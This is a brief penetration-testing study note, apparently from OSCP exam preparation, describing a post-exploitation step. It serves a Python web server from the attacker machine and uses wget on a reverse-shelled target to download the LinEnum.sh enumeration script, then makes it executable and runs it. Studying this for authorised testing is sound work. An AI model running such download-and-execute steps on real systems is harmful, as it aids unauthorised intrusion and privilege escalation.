Start a python3 web server

```
sudo python3 -m http.server 8080
```

Back on your reverse shelled target, get the linenum.sh off your desktop
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8080/LinEnum.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```
Give it exe perms

```
chmod +x LinEnum.sh
```

Run it

```
./LinEnum.sh
```
